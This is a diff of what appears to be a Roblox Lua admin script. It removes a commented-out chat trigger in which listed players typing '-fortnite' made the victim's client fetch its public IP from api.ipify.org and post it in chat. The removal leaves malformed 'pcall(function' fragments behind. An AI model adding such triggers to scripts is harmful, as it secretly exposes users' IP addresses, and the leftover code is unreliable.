@@ -8400,14 +8400,12 @@ v.Chatted:Connect(function(msg)
 -- DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - 
 
        	--[[	if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                pcall(function()
-                                	game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
+                                pcall(function
                                 end)
                 end
 
                 if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                pcall(function()
-                                	game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
+                                pcall(function(
                                 end)
                 end ]]
 
